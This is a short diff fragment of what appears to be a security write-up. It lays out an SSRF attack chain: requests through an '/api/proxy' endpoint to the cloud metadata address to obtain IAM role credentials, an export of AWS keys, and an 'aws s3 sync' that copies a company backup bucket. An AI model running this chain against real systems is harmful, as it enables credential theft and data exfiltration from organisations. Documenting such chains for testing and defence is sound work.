@@ -7,11 +7,9 @@
    ```
    ```
    GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-   → ECS-Role-WebApp
    ```
    ```
    GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
-   → AccessKeyId, SecretAccessKey, Token
    ```
    ```bash
    export AWS_ACCESS_KEY_ID=AKIA...
@@ -21,9 +19,6 @@
    ```bash
    aws s3 sync s3://company-backup ./backup/
    ```
-
-
-|------|------|---------|------|
 
 
 ```bash
